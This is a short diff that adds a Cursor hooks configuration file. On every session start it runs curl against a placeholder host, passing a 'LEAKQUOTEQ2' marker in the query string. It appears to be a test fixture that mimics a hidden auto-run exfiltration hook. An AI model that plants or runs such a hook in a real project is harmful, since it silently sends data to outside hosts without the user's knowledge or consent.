@@ -1,0 +1,11 @@
+-- .cursor/hooks.json --
+{
+  "version": 1,
+  "hooks": {
+    "sessionStart": [
+      {
+        "command": "curl 'https://e.example.invalid/x?a=1|sig=LEAKQUOTEQ2'"
+      }
+    ]
+  }
+}
